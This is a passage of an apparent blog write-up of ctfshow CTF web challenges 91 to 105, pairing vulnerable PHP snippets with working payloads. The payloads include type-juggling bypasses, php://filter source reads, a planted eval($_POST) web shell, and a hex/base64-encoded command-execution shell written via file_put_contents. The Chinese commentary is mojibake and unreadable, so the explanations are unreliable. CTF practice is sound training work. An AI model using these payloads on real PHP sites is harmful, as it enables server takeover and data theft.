class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨phpçš„å¼±ç±»å‹</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=4476a</span><br></pre></td></tr></table></figure><h2 id="web91-preg-matchçš„å‡ ç§æ¨¡å¼"><a href="#web91-preg-matchçš„å‡ ç§æ¨¡å¼" class="headerlink" title="web91(preg_matchçš„å‡ ç§æ¨¡å¼)"></a>web91(preg_matchçš„å‡ ç§æ¨¡å¼)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä»‹ç»ä¸€ä¸‹preg_matchçš„å‡ ç§æ¨¡å¼</p><blockquote><p>**i      **</p><p>å¦‚æœè®¾å®šæ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—ç¬¦å°†åŒæ—¶åŒ¹é…å¤§å°å†™å­—æ¯ã€‚</p><p><strong>m</strong>    </p><p>å½“è®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œâ€œè¡Œèµ·å§‹â€å’Œâ€œè¡Œç»“æŸâ€é™¤äº†åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²å¼€å¤´å’Œç»“æŸå¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…å…¶ä¸­çš„æ¢è¡Œç¬¦çš„ä¹‹åå’Œä¹‹å‰ã€‚</p><p><strong>s</strong><br>å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„åœ†ç‚¹å…ƒå­—ç¬¦ï¼ˆ.ï¼‰åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚æ²¡æœ‰æ­¤è®¾å®šçš„è¯ï¼Œåˆ™ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ã€‚</p><p><strong>x</strong><br>å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦é™¤äº†è¢«è½¬ä¹‰çš„æˆ–åœ¨å­—ç¬¦ç±»ä¸­çš„ä»¥å¤–å®Œå…¨è¢«å¿½ç•¥ï¼Œåœ¨æœªè½¬ä¹‰çš„å­—ç¬¦ç±»ä¹‹å¤–çš„ #ä»¥åŠä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸¤å¤´ï¼Œä¹Ÿéƒ½è¢«å¿½ç•¥ã€‚</p><p><strong>e</strong><br>å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œpreg_replace() åœ¨æ›¿æ¢å­—ç¬¦ä¸²ä¸­å¯¹é€†å‘å¼•ç”¨ä½œæ­£å¸¸çš„æ›¿æ¢ï¼Œ</p></blockquote><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=a%0aphp</span><br></pre></td></tr></table></figure><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¡äº†ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯å‰åè¿™ä¸ªä¸å¥½æï¼Œè¿˜æ˜¯ä»intvalä¸‹æ‰‹</p><p><img src="https://img-blog.csdnimg.cn/95969d4eda2a4e80a67803b195995892.png" alt="img"></p><p>ä½¿ç”¨åå…­è¿›åˆ¶æˆåŠŸæ‰¾åˆ°çªç ´å£</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=0x117c</span><br></pre></td></tr></table></figure><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åŒ¹é…äº†å¤§å°å†™å­—æ¯ï¼Œåå…­è¿›åˆ¶çš„æ–¹æ³•æ— äº†</p><p>payloadä½¿ç”¨å…«è¿›åˆ¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br></pre></td></tr></table></figure><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠå…«è¿›åˆ¶çš„è·¯å­ä¹Ÿå µä½äº†ï¼Œé‡‡ç”¨åˆ†æ•°çš„å½¢å¼</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=4476.0</span><br></pre></td></tr></table></figure><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹éš¾æå•Šï¼Œä½†æ˜¯çµæœºä¸€åŠ¨ï¼ŒåŠ ä¸ª+è¿™ç§æ²¡ç”¨çš„ç¬¦å·å°±æå®šäº†ï¼Œç©ºæ ¼ä¹Ÿå¯</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=+010574</span><br><span class="line">num= 010574</span><br></pre></td></tr></table></figure><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜æ¯”è¾ƒç®€å•</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=./flag.php</span><br><span class="line">num=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>å¾ˆåŸºç¡€çš„é¢˜ç›®äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>md5ï¼Œä¼ å…¥ä¸¤ä¸ªæ•°ç»„ä¼šè¿”å›faulse</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¯»æ‡‚é¢˜æ„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP_FLAG=flag</span><br><span class="line">[post data]</span><br><span class="line">HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»–è¦å¹²å•¥æ²¡ä»”ç»†çœ‹ï¼Œç›´æ¥ok</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=1.php</span><br><span class="line">[post data]</span><br><span class="line">content=&lt;?php eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web100-ä¼˜å…ˆçº§"><a href="#web100-ä¼˜å…ˆçº§" class="headerlink" title="web100(ä¼˜å…ˆçº§)"></a>web100(ä¼˜å…ˆçº§)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHPé‡Œé¢ <code>=</code>çš„ä¼˜å…ˆçº§æ˜¯æ¯”<code>and</code>ä¼˜å…ˆçº§é«˜</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=var_dump(get_class_vars&amp;v3=);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=eval($_POST[1]) ?&gt;%23&amp;v3=;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ç‚¹å‘ï¼Œè¯»åˆ°çš„flagï¼Œéœ€è¦å°†ä¸­é—´çš„0x2dç»™æ›¿æ¢æ‰ã€‚æ”¹ä¸º-</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„ç”¨åå°„ç±»æ¥è¾“å‡ºctfshowç±»</p><h3 id="Reflectionclass"><a href="#Reflectionclass" class="headerlink" title="Reflectionclass"></a>Reflectionclass</h3><p>åå°„ç±»ä¸ä»…ä»…å¯ä»¥å»ºç«‹å¯¹ç±»çš„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥<strong>å»ºç«‹å¯¹PHPåŸºæœ¬æ–¹æ³•çš„æ˜ å°„</strong>ï¼Œå¹¶ä¸”è¿”å›åŸºæœ¬æ–¹æ³•æ‰§è¡Œçš„æƒ…å†µã€‚å› æ­¤å¯ä»¥é€šè¿‡å»ºç«‹åå°„ç±»<code>new ReflectionClass(system(&#39;cmd&#39;))</code>æ¥æ‰§è¡Œå‘½ä»¤</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ­¤é¢˜æƒ³äº†åŠå¤©æ²¡æ€è·¯ï¼Œåº·åº·ç¾¤ä¸»çš„è§£æ³•ï¼Œè¢«ç§€åˆ°äº†</p><p>è¿™ä¸ª16è¿›åˆ¶æœ‰ç‚¹ç»å•Š,</p><h3 id="ç‰¹æ®Šçš„æ•°å­—"><a href="#ç‰¹æ®Šçš„æ•°å­—" class="headerlink" title="ç‰¹æ®Šçš„æ•°å­—"></a>ç‰¹æ®Šçš„æ•°å­—</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5044383959474e6864434171594473</span><br><span class="line">PD89YGNhdCAqYDs</span><br><span class="line">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">[post data]</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&#x27;Sorry&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤åç¼€å¯¹åšé¢˜æ²¡å•¥å½±å“ï¼Œå› ä¸ºæœ€åè¾“å‡ºçš„æ˜¯base64å†…å®¹çš„</p><p>æ•…æŠ€é‡æ–½ï¼</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯md5è¿™ä¸€ç±»é¢˜çš„è€å¥—è·¯ï¼Œæ„é€ æ•°ç»„ç„¶åfaulse=faulse</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2[]=2</span><br><span class="line">[post data]</span><br><span class="line">v1[]=1</span><br></pre></td></tr></table></figure><h2 id="web105-å˜é‡è¦†ç›–"><a href="#web105-å˜é‡è¦†ç›–" class="headerlink" title="web105(å˜é‡è¦†ç›–)"></a>web105(å˜é‡è¦†ç›–)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 